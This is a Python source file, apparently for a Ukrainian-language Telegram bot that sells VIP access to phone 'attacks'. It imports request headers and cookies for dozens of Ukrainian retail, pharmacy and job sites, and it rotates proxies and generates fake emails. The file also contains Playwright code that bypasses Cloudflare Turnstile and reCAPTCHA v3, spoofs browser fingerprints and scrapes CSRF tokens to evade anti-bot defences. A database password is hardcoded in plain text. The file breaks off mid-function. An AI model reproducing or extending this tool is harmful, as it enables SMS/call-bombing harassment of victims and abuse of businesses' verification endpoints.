from aiogram import *
import fake_useragent
import asyncio
import logging
try:
    from playwright.async_api import async_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False
    logging.warning("Playwright не встановлено. Автоматичне отримання cf-turnstile-response токену буде недоступне.")
from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher import FSMContext
from aiogram.types import Message
from markups import checkSubMenu
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.utils.exceptions import BotBlocked, UserDeactivated, ChatNotFound
from aiohttp import BasicAuth
from headers_main import (
    headers_dnipro, headers_citrus, headers_easypay, cookies_citrus, cookies_dnipro,
    headers_uvape, cookies_uvape, headers_terravape, cookies_terravape,
    headers_moyo, cookies_moyo, headers_sushiya, headers_zolota, cookies_zolota,
    headers_avtoria, cookies_avtoria, headers_elmir, cookies_elmir, headers_elmir_call,
    cookies_elmir_call, headers_apteka24, headers_ta_da, headers_monto, cookies_monto,
    headers_smartmedical, cookies_smartmedical, headers_silpo, headers_goodwine,
    headers_finbert, cookies_finbert, headers_brabrabra, cookies_brabrabra,
    headers_workua, cookies_workua, headers_binance, cookies_binance, headers_trafficguard,
    headers_la, headers_eva
)
import asyncpg
import config
import aiohttp
import random
import string
import re
import uuid
from bs4 import BeautifulSoup 
from datetime import datetime, timedelta
import urllib.parse
import itertools
import json
import base64
import hashlib
try:
    from zoneinfo import ZoneInfo
except ImportError:
    # Для Python < 3.9 використовуємо pytz
    try:
        import pytz
        ZoneInfo = None
    except ImportError:
        ZoneInfo = None
        pytz = None

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

ADMIN = [810944378]
channel_id = "-1003203193556"

# Функція для отримання поточної дати за київським часом
def get_kyiv_date():
    """Повертає поточну дату за київським часом"""
    if ZoneInfo:
        # Python 3.9+
        kyiv_tz = ZoneInfo("Europe/Kyiv")
        return datetime.now(kyiv_tz).date()
    elif pytz:
        # Python < 3.9 з pytz
        kyiv_tz = pytz.timezone("Europe/Kyiv")
        return datetime.now(kyiv_tz).date()
    else:
        # Fallback - використовуємо системний час (не ідеально, але краще нічого)
        return datetime.now().date()

# Функція для отримання поточного datetime за київським часом
def get_kyiv_datetime():
    """Повертає поточний datetime за київським часом (offset-naive для бази даних)"""
    if ZoneInfo:
        # Python 3.9+
        kyiv_tz = ZoneInfo("Europe/Kyiv")
        kyiv_now = datetime.now(kyiv_tz)
        # Конвертуємо в UTC і прибираємо часовий пояс для бази даних
        return kyiv_now.astimezone(ZoneInfo("UTC")).replace(tzinfo=None)
    elif pytz:
        # Python < 3.9 з pytz
        kyiv_tz = pytz.timezone("Europe/Kyiv")
        utc_tz = pytz.UTC
        kyiv_now = datetime.now(kyiv_tz)
        # Конвертуємо в UTC і прибираємо часовий пояс для бази даних
        utc_now = kyiv_now.astimezone(utc_tz)
        return utc_now.replace(tzinfo=None)
    else:
        # Fallback - використовуємо системний час
        return datetime.now()

message = ("Привіт.\nВаш вибір: 👇")

db_config = {
    'user': 'postgres',
    'password': 'QzsAGhrwcEEDuXlhmedoQJXYGTHfcvZV',
    'database': 'railway',
    'host': 'postgres.railway.internal',
    'port': '5432',
}

# Використовуємо пул з'єднань замість одного з'єднання
db_pool = None

attack_flags = {}
# Прапорці для активних атак користувачів (щоб не дозволити одночасні атаки)
# Використовуємо chat_id як ключ (в private чатах chat_id == user_id)
active_attacks = {}  # chat_id -> True/False
# Прапорці для розіграшів
giveaway_flags = {}

proxies_all = []
proxies_healthy = []
proxies_last_check = None
proxies_stats = []  # list of {entry, latency_ms}
proxies_usage = {}  # key -> count
proxies_usage_total = 0
proxies_success = {}  # key -> count (успішні запити)
proxies_failed = {}  # key -> count (неуспішні запити)

last_status_msg = {}  # chat_id -> message_id

storage = MemoryStorage()
bot = Bot(token=config.token)
dp = Dispatcher(bot, storage=storage)


async def init_db():
    global db_pool
    logging.info(f"Підключення до БД: {db_config['user']}@{db_config['host']}:{db_config['port']}/{db_config['database']}")
    try:
        db_pool = await asyncpg.create_pool(**db_config, min_size=5, max_size=20)
        logging.info("✅ Успішно підключено до бази даних")
    except Exception as e:
        logging.error(f"❌ Помилка підключення до БД: {e}")
        raise
    
    # Отримуємо інформацію про бота для обробки згадок
    try:
        bot._me = await bot.get_me()
    except Exception as e:
        logging.error(f"Помилка отримання інформації про бота: {e}")
    
    async with db_pool.acquire() as conn:
        logging.info("🔨 Початок створення таблиць...")
        
        # Спочатку перевіряємо чи таблиці вже існують
        try:
            existing_tables = await conn.fetch('''
                SELECT table_name 
                FROM information_schema.tables 
                WHERE table_schema = 'public'
            ''')
            if existing_tables:
                logging.info(f"📋 Існуючі таблиці ДО створення: {[t['table_name'] for t in existing_tables]}")
            else:
                logging.info("📋 Таблиць не знайдено, створюємо нові...")
        except Exception as e:
            logging.warning(f"Не вдалося перевірити існуючі таблиці: {e}")
        # Створюємо таблиці окремо для кращої обробки помилок
        try:
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    user_id BIGINT PRIMARY KEY,
                    name TEXT,
                    username TEXT,
                    block INTEGER DEFAULT 0,
                    last_attack_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                );
            ''')
            logging.info("✅ Таблиця users створена або вже існує")
        except Exception as e:
            logging.error(f"❌ Помилка створення таблиці users: {e}")
            raise
        
        try:
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS blacklist (
                    phone_number TEXT PRIMARY KEY,
                    blocked_by BIGINT
                );
            ''')
            logging.info("✅ Таблиця blacklist створена або вже існує")
        except Exception as e:
            logging.error(f"❌ Помилка створення таблиці blacklist: {e}")
            raise
        
        try:
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS user_messages (
                    id SERIAL PRIMARY KEY,
                    user_id BIGINT,
                    username TEXT,
                    name TEXT,
                    message_text TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                );
            ''')
            logging.info("✅ Таблиця user_messages створена або вже існує")
        except Exception as e:
            logging.error(f"❌ Помилка створення таблиці user_messages: {e}")
            raise
        
        # Додаємо колонки якщо їх немає
        try:
            await conn.execute('ALTER TABLE user_messages ADD COLUMN IF NOT EXISTS username TEXT')
        except Exception as e:
            logging.error(f"Error adding username column to user_messages: {e}")
        
        try:
            await conn.execute('ALTER TABLE user_messages ADD COLUMN IF NOT EXISTS name TEXT')
        except Exception as e:
            logging.error(f"Error adding name column to user_messages: {e}")
        
        # Видаляємо таблиці, які більше не використовуються
        try:
            await conn.execute('DROP TABLE IF EXISTS promo_activations')
        except Exception as e:
            logging.error(f"Error dropping promo_activations table: {e}")
        
        try:
            await conn.execute('DROP TABLE IF EXISTS promocodes')
        except Exception as e:
            logging.error(f"Error dropping promocodes table: {e}")
        
        try:
            await conn.execute('DROP TABLE IF EXISTS referrals')
        except Exception as e:
            logging.error(f"Error dropping referrals table: {e}")
        
        # Видаляємо колонки, які більше не використовуються з таблиці users
        try:
            await conn.execute('ALTER TABLE users DROP COLUMN IF EXISTS attacks_left')
        except Exception as e:
            logging.error(f"Error dropping attacks_left column: {e}")
        
        try:
            await conn.execute('ALTER TABLE users DROP COLUMN IF EXISTS promo_attacks')
        except Exception as e:
            logging.error(f"Error dropping promo_attacks column: {e}")
        
        try:
            await conn.execute('ALTER TABLE users DROP COLUMN IF EXISTS referral_attacks')
        except Exception as e:
            logging.error(f"Error dropping referral_attacks column: {e}")
        
        try:
            await conn.execute('ALTER TABLE users DROP COLUMN IF EXISTS unused_referral_attacks')
        except Exception as e:
            logging.error(f"Error dropping unused_referral_attacks column: {e}")
        
        try:
            await conn.execute('ALTER TABLE users DROP COLUMN IF EXISTS referrer_id')
        except Exception as e:
            logging.error(f"Error dropping referrer_id column: {e}")
        
        try:
            await conn.execute('ALTER TABLE users DROP COLUMN IF EXISTS referral_count')
        except Exception as e:
            logging.error(f"Error dropping referral_count column: {e}")
        
        try:
            await conn.execute('ALTER TABLE users DROP COLUMN IF EXISTS referral_notification_sent')
        except Exception as e:
            logging.error(f"Error dropping referral_notification_sent column: {e}")
        
        # Додаємо нові колонки якщо їх немає
        try:
            await conn.execute('ALTER TABLE users ALTER COLUMN last_attack_date TYPE TIMESTAMP USING last_attack_date::timestamp')
        except Exception as e:
            logging.error(f"Error changing last_attack_date column type: {e}")

        try:
            await conn.execute('ALTER TABLE users ADD COLUMN IF NOT EXISTS is_vip BOOLEAN DEFAULT FALSE')
        except Exception as e:
            logging.error(f"Error adding is_vip column: {e}")

        try:
            await conn.execute('ALTER TABLE users ADD COLUMN IF NOT EXISTS vip_expires_at TIMESTAMP')
        except Exception as e:
            logging.error(f"Error adding vip_expires_at column: {e}")
        
        # Додаємо поле blocked_by до таблиці blacklist якщо його немає
        try:
            await conn.execute('ALTER TABLE blacklist ADD COLUMN IF NOT EXISTS blocked_by BIGINT')
            # Старі записи без blocked_by залишаються доступними тільки для розблокування адмінами
        except Exception as e:
            logging.error(f"Error adding blocked_by column to blacklist: {e}")
        
        # Перевіряємо що таблиці створені
        try:
            tables = await conn.fetch('''
                SELECT table_name 
                FROM information_schema.tables 
                WHERE table_schema = 'public'
                ORDER BY table_name
            ''')
            table_names = [table['table_name'] for table in tables]
            logging.info(f"📊 Таблиці в базі даних ({len(table_names)}): {', '.join(table_names) if table_names else 'НЕ ЗНАЙДЕНО!'}")
            
            if not table_names:
                logging.warning("⚠️ УВАГА: Таблиці не знайдено! Можливо помилка при створенні.")
            elif 'users' not in table_names or 'blacklist' not in table_names or 'user_messages' not in table_names:
                logging.warning(f"⚠️ Деякі таблиці відсутні! Очікувані: users, blacklist, user_messages. Знайдені: {table_names}")
        except Exception as e:
            logging.error(f"❌ Помилка перевірки таблиць: {e}")

class Dialog(StatesGroup):
    spam = State()
    block_user = State()
    unblock_user = State()
    add_to_blacklist = State()
    search_user = State()
    give_vip = State()
    give_vip_12h = State()
    extend_vip = State()
    remove_vip = State()
    choose_attack_type = State()

async def email():
    name_length = random.randint(6, 12)
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=name_length))
    generated_email = f"{name}@gmail.com"
    logging.info(f"email: {generated_email}")
    return generated_email

async def get_turnstile_token(proxy_url=None, proxy_auth=None):
    """
    Отримує токен Cloudflare Turnstile через автоматизований браузер Playwright
    """
    if not PLAYWRIGHT_AVAILABLE:
        logging.warning("Playwright не встановлено. Використовується статичний токен.")
        return None
    
    try:
        async with async_playwright() as p:
            # Налаштування браузера
            browser_options = {
                "headless": True,
                "args": ["--disable-blink-features=AutomationControlled"]
            }
            
            # Додаємо проксі якщо є
            if proxy_url:
                # Конвертуємо проксі формат для Playwright
                # Формат: http://user:pass@host:port
                proxy_config = {"server": proxy_url}
                browser_options["proxy"] = proxy_config
            
            browser = await p.chromium.launch(**browser_options)
            
            # Створюємо контекст з cookies
            context = await browser.new_context(
                viewport={"width": 1920, "height": 1080},
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            )
            
            page = await context.new_page()
            
            # Чекаємо поки Turnstile завантажиться та отримає токен
            try:
                # Шукаємо елемент Turnstile
                await page.wait_for_selector('iframe[src*="challenges.cloudflare.com"]', timeout=10000)
                logging.info("Знайдено iframe Cloudflare Turnstile")
                
                # Чекаємо поки токен з'явиться (Turnstile автоматично проходить перевірку)
                await page.wait_for_timeout(5000)  # Чекаємо 5 секунд на проходження перевірки
                
                # Отримуємо токен з JavaScript
                token = await page.evaluate("""
                    () => {
                        // Шукаємо всі iframe з Turnstile
                        const iframes = document.querySelectorAll('iframe[src*="challenges.cloudflare.com"]');
                        for (let iframe of iframes) {
                            try {
                                // Намагаємося отримати токен з callback
                                const token = iframe.contentWindow?.turnstile?.getResponse();
                                if (token) return token;
                            } catch (e) {}
                        }
                        
                        // Або шукаємо в формі
                        const form = document.querySelector('form');
                        if (form) {
                            const input = form.querySelector('input[name="cf-turnstile-response"]');
                            if (input && input.value) return input.value;
                        }
                        
                        // Або шукаємо в глобальній змінній
                        if (window.turnstileResponse) return window.turnstileResponse;
                        
                        return null;
                    }
                """)
                
                if token:
                    logging.info(f"Отримано Turnstile токен: {token[:50]}...")
                    await browser.close()
                    return token
                else:
                    logging.warning("Токен Turnstile не знайдено на сторінці")
                    
                    # Спробуємо клікнути на форму щоб активувати Turnstile
                    try:
                        form = await page.query_selector('form')
                        if form:
                            await form.evaluate("form => form.dispatchEvent(new Event('submit'))")
                            await page.wait_for_timeout(3000)
                            
                            # Знову шукаємо токен
                            token = await page.evaluate("""
                                () => {
                                    const input = document.querySelector('input[name="cf-turnstile-response"]');
                                    return input ? input.value : null;
                                }
                            """)
                            
                            if token:
                                logging.info(f"Отримано Turnstile токен після активації: {token[:50]}...")
                                await browser.close()
                                return token
                    except Exception as e:
                        logging.error(f"Помилка активації Turnstile: {e}")
                    
            except Exception as e:
                logging.error(f"Помилка очікування Turnstile: {e}")
            
            await browser.close()
            return None
            
    except Exception as e:
        logging.error(f"Помилка отримання Turnstile токену через Playwright: {e}")
        return None

async def get_recaptcha_v3_token(site_key, action='submit', url=None, proxy_url=None, proxy_auth=None):
    """
    Отримує токен reCAPTCHA v3 через автоматизований браузер Playwright
    site_key: ключ reCAPTCHA сайту (6L...)
    action: дія для reCAPTCHA (зазвичай 'submit' або інше)
    url: URL сторінки де знаходиться reCAPTCHA (опціонально)
    """
    if not PLAYWRIGHT_AVAILABLE:
        logging.warning("Playwright не встановлено. reCAPTCHA v3 токен недоступний.")
        return None
    
    try:
        async with async_playwright() as p:
            browser_options = {
                "headless": True,
                "args": ["--disable-blink-features=AutomationControlled"]
            }
            
            if proxy_url:
                proxy_config = {"server": proxy_url}
                browser_options["proxy"] = proxy_config
            
            browser = await p.chromium.launch(**browser_options)
            
            context = await browser.new_context(
                viewport={"width": 1920, "height": 1080},
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            )
            
            page = await context.new_page()
            
            try:
                # Якщо URL не надано, створюємо тестову сторінку з reCAPTCHA
                if not url:
                    # Створюємо HTML сторінку з reCAPTCHA v3
                    html_content = f"""
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <script src="https://www.google.com/recaptcha/api.js?render={site_key}"></script>
                    </head>
                    <body>
                        <div id="recaptcha-container"></div>
                        <script>
                            grecaptcha.ready(function() {{
                                grecaptcha.execute('{site_key}', {{action: '{action}'}})
                                    .then(function(token) {{
                                        window.recaptchaToken = token;
                                        document.body.setAttribute('data-token', token);
                                    }});
                            }});
                        </script>
                    </body>
                    </html>
                    """
                    await page.set_content(html_content)
                else:
                    # Завантажуємо реальну сторінку
                    await page.goto(url, wait_until="networkidle", timeout=30000)
                
                # Чекаємо поки reCAPTCHA завантажиться та отримає токен
                await page.wait_for_timeout(3000)
                
                # Отримуємо токен через JavaScript
                token = await page.evaluate(f"""
                    async () => {{
                        // Спробуємо отримати токен через grecaptcha.execute
                        if (typeof grecaptcha !== 'undefined' && grecaptcha.ready) {{
                            try {{
                                const token = await grecaptcha.execute('{site_key}', {{action: '{action}'}});
                                return token;
                            }} catch (e) {{
                                console.error('Помилка виконання grecaptcha:', e);
                            }}
                        }}
                        
                        // Або шукаємо в атрибуті
                        const tokenAttr = document.body.getAttribute('data-token');
                        if (tokenAttr) return tokenAttr;
                        
                        // Або шукаємо в глобальній змінній
                        if (window.recaptchaToken) return window.recaptchaToken;
                        
                        // Або шукаємо в input полі
                        const input = document.querySelector('input[name="g-recaptcha-response"]');
                        if (input && input.value) return input.value;
                        
                        return null;
                    }}
                """)
                
                if token:
                    logging.info(f"Отримано reCAPTCHA v3 токен: {token[:50]}...")
                    await browser.close()
                    return token
                else:
                    logging.warning("Токен reCAPTCHA v3 не знайдено")
                    # Чекаємо ще трохи
                    await page.wait_for_timeout(2000)
                    token = await page.evaluate("() => window.recaptchaToken || document.body.getAttribute('data-token')")
                    if token:
                        logging.info(f"Отримано reCAPTCHA v3 токен після очікування: {token[:50]}...")
                        await browser.close()
                        return token
                    
            except Exception as e:
                logging.error(f"Помилка отримання reCAPTCHA v3 токену: {e}")
            
            await browser.close()
            return None
            
    except Exception as e:
        logging.error(f"Помилка отримання reCAPTCHA v3 токену через Playwright: {e}")
        return None

async def get_trafficguard_fingerprint(proxy_url=None, proxy_auth=None):
    """
    Отримує реальний browser fingerprinting для TrafficGuard через Playwright
    """
    if not PLAYWRIGHT_AVAILABLE:
        logging.warning("Playwright не встановлено. Використовуються базові значення для TrafficGuard.")
        return None
    
    try:
        async with async_playwright() as p:
            browser_options = {
                "headless": True,
                "args": ["--disable-blink-features=AutomationControlled"]
            }
            
            if proxy_url:
                proxy_config = {"server": proxy_url}
                browser_options["proxy"] = proxy_config
            
            browser = await p.chromium.launch(**browser_options)
            
            context = await browser.new_context(
                viewport={"width": 1920, "height": 1080},
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0",
                locale="uk-UA",
                timezone_id="Atlantic/Reykjavik"
            )
            
            page = await context.new_page()
            await page.goto("https://rozetka.com.ua/", wait_until="domcontentloaded", timeout=30000)
            await page.wait_for_timeout(2000)
            
            # Отримуємо fingerprinting дані з браузера
            fingerprint_data = await page.evaluate("""
                () => {
                    const data = {
                        screen_resolution: screen.width + ',' + screen.height,
                        available_screen_resolution: screen.availWidth + ',' + screen.availHeight,
                        system_version: navigator.platform,
                        brand_model: 'unknown',
                        system_lang: navigator.language,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        timezoneOffset: new Date().getTimezoneOffset(),
                        user_agent: navigator.userAgent,
                        list_plugin: Array.from(navigator.plugins).map(p => p.name).join(','),
                        canvas_code: '9f305daa',
                        webgl_vendor: 'Mozilla',
                        webgl_renderer: 'Mozilla',
                        audio: '35.749972093850374',
                        platform: 'Win32',
                        web_timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        device_name: 'unknown',
                        fingerprint: '3d2021de20e83ad5eb7bd8637a2051ee',
                        device_id: '',
                        related_device_ids: ''
                    };
                    return data;
                }
            """)
            
            await browser.close()
            return fingerprint_data
            
    except Exception as e:
        logging.warning(f"Помилка отримання fingerprinting для TrafficGuard: {e}")
        return None

async def get_csrf_token(url, headers=None):
    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=headers) as response:
            html = await response.text()
            soup = BeautifulSoup(html, "html.parser")

            csrf_token = soup.find("input", {"name": "_csrf"})
            if csrf_token:
                return csrf_token.get("value")
            
            csrf_middleware_token = soup.find("input", {"name": "csrfmiddlewaretoken"})
            if csrf_middleware_token:
                return csrf_middleware_token.get("value")
            
            meta_token = soup.find("meta", {"name": "csrf-token"})
            if meta_token:
                return meta_token.get("content")
            
            raise ValueError("CSRF-токен не знайдено.")

def get_cancel_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("🛑 Зупинити атаку", callback_data="cancel_attack"))
    return keyboard

async def check_vip_status(user_id):
    """Перевіряє чи користувач має VIP статус"""
    if user_id in ADMIN:
        return True  # Адміни завжди мають VIP
    try:
        async with db_pool.acquire() as conn:
            result = await conn.fetchrow('SELECT is_vip, vip_expires_at FROM users WHERE user_id = $1', user_id)
            if result:
                if not result['is_vip']:
                    return False
                # Перевіряємо чи не закінчився VIP
                if result['vip_expires_at']:
                    now = get_kyiv_datetime()
                    expires_at = result['vip_expires_at']
                    # PostgreSQL повертає datetime об'єкт, але перевіряємо на всяк випадок
                    if isinstance(expires_at, str):
                        # Якщо це рядок, конвертуємо в datetime
                        expires_at = datetime.strptime(expires_at, '%Y-%m-%d %H:%M:%S')
                    # Якщо expires_at - це datetime з timezone, конвертуємо в naive
                    if hasattr(expires_at, 'replace'):
                        expires_at = expires_at.replace(tzinfo=None)
                    if expires_at < now:
                        # VIP закінчився, оновлюємо статус
                        await conn.execute('UPDATE users SET is_vip = FALSE WHERE user_id = $1', user_id)
                        return False
                    return True
                # Якщо vip_expires_at не встановлено, але is_vip = True, вважаємо що VIP активний
                return True
            return False
    except Exception as e:
        logging.error(f"Помилка перевірки VIP статусу для користувача {user_id}: {e}")
        return False

async def check_subscription_status(user_id):
    # Адміни завжди проходять перевірку
    if user_id in ADMIN:
        return True
    try:
        member = await bot.get_chat_member(chat_id=channel_id, user_id=user_id)
        # Отримуємо статус різними способами для сумісності
        status_raw = member.status
        status_str = str(status_raw).lower()
        
        # Логуємо статус для діагностики
        logging.info(f"Користувач {user_id}: статус в каналі = '{status_str}' (тип: {type(status_raw).__name__})")
        
        # Список статусів, які означають що користувач НЕ підписаний
        # "restricted" може означати підписку з обмеженнями, тому його не включаємо
        not_subscribed_statuses = ["left", "kicked"]
        
        # Якщо статус НЕ в списку "не підписаних", значить користувач підписаний
        if status_str not in not_subscribed_statuses:
            logging.info(f"Користувач {user_id} успішно пройшов перевірку підписки (статус: {status_str})")
            return True
        
        # Логуємо якщо статус означає що користувач не підписаний
        logging.warning(f"Користувач {user_id} не підписаний (статус: {status_str})")
    except ChatNotFound as e:
        logging.error(f"Канал не знайдено для користувача {user_id}: {e}")
        logging.error(f"Перевірте чи бот доданий до каналу {channel_id} як адміністратор")
        # Якщо канал не знайдено, пропускаємо перевірку (щоб не блокувати користувачів)
        # Але можна змінити на return False, якщо потрібно блокувати при відсутності каналу
        return True  # Пропускаємо перевірку якщо канал недоступний
    except Exception as e:
        error_type = type(e).__name__
        error_msg = str(e)
        logging.error(f"Помилка перевірки підписки для користувача {user_id}: {error_type}: {error_msg}")
        
        # Якщо помилка "Chat not found" або подібна, пропускаємо перевірку
        if "not found" in error_msg.lower() or "chat" in error_msg.lower():
            logging.warning(f"Канал недоступний для перевірки, пропускаємо перевірку для користувача {user_id}")
            return True
        
        # Якщо помилка через те, що бот не має доступу, спробуємо альтернативний метод
        try:
            # Спробуємо отримати інформацію про канал
            chat = await bot.get_chat(chat_id=channel_id)
            logging.info(f"Бот має доступ до каналу {channel_id}, але не може перевірити учасників")
        except Exception as chat_error:
            logging.error(f"Бот не може отримати доступ до каналу {channel_id}: {chat_error}")
            logging.error(f"ВАЖЛИВО: Переконайтеся що бот доданий до каналу як адміністратор з правами перегляду учасників!")
            # Якщо канал недоступний, пропускаємо перевірку
            return True
    return False

async def anti_flood(*args, **kwargs):
    m = args[0]
    # Перевіряємо, що повідомлення з особистого чату
    if m.chat.type == 'private':
        await m.answer("Спокійно, не поспішай! 🐢")

# Оновлюємо клавіатури
profile_button = types.KeyboardButton('🎯 Почати атаку')
referal_button = types.KeyboardButton('🆘 Допомога')
profile_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True).add(profile_button, referal_button)

admin_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
admin_keyboard.add("Надіслати повідомлення користувачам")
admin_keyboard.add("Статистика бота")
admin_keyboard.add("Заблокувати користувача")
admin_keyboard.add("Розблокувати користувача")
admin_keyboard.add("Пошук користувача")
admin_keyboard.add("Видати віп")
admin_keyboard.add("Видати віп на 12 годин")
admin_keyboard.add("Продлити віп")
admin_keyboard.add("Усі користувачі")
admin_keyboard.add("Забрати віп")
admin_keyboard.add("Перевірити проксі")
admin_keyboard.add("Перевірити сервіси")
admin_keyboard.add("Назад")

def load_proxies_from_file(path: str = "proxy.txt"):
    result = []
    try:
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                parts = line.split(":")
                if len(parts) != 4:
                    continue
                host, port, user, password = parts
                result.append({"host": host, "port": port, "user": user, "password": password})
    except FileNotFoundError:
        # Файл не існує - це нормально, атаки працюватимуть без проксі
        logging.info(f"Файл проксі '{path}' не знайдено. Атаки будуть виконуватись без проксі.")
    except Exception as e:
        logging.warning(f"Помилка при завантаженні проксі: {e}")
    return result

def build_proxy_params(entry):
    try:
        # Використовуємо http:// для проксі (aiohttp автоматично підтримує HTTPS через CONNECT)
        url = f"http://{entry['host']}:{entry['port']}"
        auth = BasicAuth(entry["user"], entry["password"]) if entry.get("user") and entry.get("password") else None
        return url, auth
    except Exception:
        return None, None

def proxy_key(entry):
    return f"{entry['host']}:{entry['port']}:{entry.get('user','')}"

async def check_single_proxy(entry):
    """
    Перевіряє проксі, роблячи кілька запитів для визначення реальної стабільності.
    Повертає середню затримку та кількість успішних запитів.
    """
    proxy_url, proxy_auth = build_proxy_params(entry)
    if not proxy_url:
        return None
    
    # Робимо 3 запити для перевірки стабільності
    test_url = "https://api.ipify.org?format=json"
    success_count = 0
    total_latency = 0.0
    attempts = 3
    
    try:
        timeout = aiohttp.ClientTimeout(total=5)
        
        for attempt in range(attempts):
            try:
                started = asyncio.get_event_loop().time()
                async with aiohttp.ClientSession(timeout=timeout) as session:
                    async with session.get(test_url, proxy=proxy_url, proxy_auth=proxy_auth) as resp:
                        if resp.status == 200:
                            latency = (asyncio.get_event_loop().time() - started) * 1000.0
                            total_latency += latency
                            success_count += 1
                        else:
                            # Неуспішний запит
                            pass
            except Exception:
                # Помилка запиту - не рахуємо як успішний
                pass
            
            # Невелика затримка між спробами
            if attempt < attempts - 1:
                await asyncio.sleep(0.3)
        
        # Проксі вважається робочим, якщо хоча б один запит успішний
        if success_count > 0:
            avg_latency = total_latency / success_count
            return {
                "entry": entry, 
                "latency_ms": avg_latency,
                "success_rate": success_count / attempts  # Стабільність від 0 до 1
            }
    except Exception:
        return None
    return None

async def check_and_update_proxies():
    global proxies_all, proxies_healthy, proxies_last_check, proxies_stats
    proxies_all = load_proxies_from_file()
    if not proxies_all:
        proxies_healthy = []
        proxies_stats = []
        proxies_last_check = datetime.now()
        return {"total": 0, "healthy": 0}
    sem = asyncio.Semaphore(50)
    async def worker(e):
        async with sem:
            return await check_single_proxy(e)
    tasks = [worker(e) for e in proxies_all]
    results = await asyncio.gather(*tasks, return_exceptions=False)
    healthy = [r for r in results if r]
    proxies_healthy = [r["entry"] for r in healthy]
    proxies_stats = healthy
    proxies_last_check = datetime.now()
    return {"total": len(proxies_all), "healthy": len(proxies_healthy)}

def proxy_status_text():
    total = len(proxies_all)
    healthy = len(proxies_healthy)
    when = proxies_last_check.strftime("%d.%m.%Y %H:%M:%S") if proxies_last_check else "—"
    return f"Проксі — всього: {total}\nРобочих: {healthy}\nОстання перевірка: {when}"

def generate_promo_code():
    """Генерує промокод з заголовних літер та цифр довжиною 10-20 символів"""
    length = random.randint(10, 20)
    characters = string.ascii_uppercase + string.digits
    return ''.join(random.choices(characters, k=length))

async def add_user(user_id: int, name: str, username: str):
    today = get_kyiv_date()
    async with db_pool.acquire() as conn:
        await conn.execute(
            'INSERT INTO users (user_id, name, username, block, last_attack_date, is_vip) VALUES ($1, $2, $3, $4, $5, $6) ON CONFLICT (user_id) DO NOTHING',
            user_id, name, username, 0, today, False
        )
        
        
        profile_link = f'<a href="tg://user?id={user_id}">{name}</a>'
        for admin_id in ADMIN:
            try:
                await bot.send_message(admin_id, f"Новий користувач зареєструвався у боті:\nІм'я: {profile_link}\n\n🆔 ID:\n<code>{user_id}</code>", parse_mode='HTML')
            except Exception as e:
                logging.error(f"Помилка при відправленні адміну {admin_id}: {e}")

async def startuser(message:types.Message):
    user_id = message.from_user.id
    if await check_subscription_status(user_id):
        await message.answer(message, reply_markup=profile_keyboard)
    else:
        await message.answer("Ви не підписані", reply_markup=checkSubMenu)

@dp.message_handler(commands=['start'])
async def start(message: Message):
    # Перевіряємо, що команда з особистого чату
    if message.chat.type != 'private':
        return  # Ігноруємо команду /start в групах
    
    user_id = message.from_user.id
    
    if not await check_subscription_status(user_id):
        await message.answer("Для використання бота потрібно підписатися на наш канал!", reply_markup=checkSubMenu)
        return
    
    # Завжди додаємо користувача до БД, якщо його там немає (ПЕРЕД перевіркою VIP)
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow('SELECT block FROM users WHERE user_id = $1', user_id)
        
        # Якщо користувача немає в БД, додаємо його
        if result is None:
            await add_user(message.from_user.id, message.from_user.full_name, message.from_user.username)
            # Оновлюємо result після додавання
            result = await conn.fetchrow('SELECT block FROM users WHERE user_id = $1', user_id)
    
    # Перевірка VIP статусу (після додавання до БД)
    if not await check_vip_status(user_id):
        # Повідомляємо адміну про користувача без VIP
        username = message.from_user.username or "Без username"
        name = message.from_user.full_name or "Без імені"
        for admin_id in ADMIN:
            try:
                await bot.send_message(
                    admin_id,
                    f"⚠️ <b>Користувач без Premium спробував використати бота</b>\n\n"
                    f"👤 Ім'я: <a href='tg://user?id={user_id}'>{name}</a>\n"
                    f"📱 Username: @{username}\n\n"
                    f"🆔 ID:\n<code>{user_id}</code>",
                    parse_mode='HTML'
                )
            except Exception as e:
                logging.error(f"Помилка при відправленні адміну {admin_id}: {e}")
        
        await message.answer(
            "🔒 <b>Premium доступ недоступний</b>\n\n"
            "На жаль, у вас немає Premium статусу для використання бота.\n"
            "Для отримання доступу зверніться до адміністратора.",
            parse_mode="HTML"
        )
        return
    
    if message.from_user.id in ADMIN:
        await message.answer('Введіть команду /admin', reply_markup=profile_keyboard)
    else:
        if result and result['block'] == 1:
            await message.answer("Вас заблоковано і ви не можете користуватися ботом.")
            return
        
        welcome_text = f"🎉 Вітаю, {message.from_user.first_name}!\n\n"
        welcome_text = 'Використовуючи бота ви автоматично погоджуєтесь з <a href="https://telegra.ph/Umovi-vikoristannya-10-26-2">умовами використання</a>\n\n'

        
        await bot.send_message(user_id, welcome_text, reply_markup=profile_keyboard, parse_mode='HTML')

@dp.callback_query_handler(text="subchanneldone")
async def process_subscription_confirmation(callback_query: types.CallbackQuery):
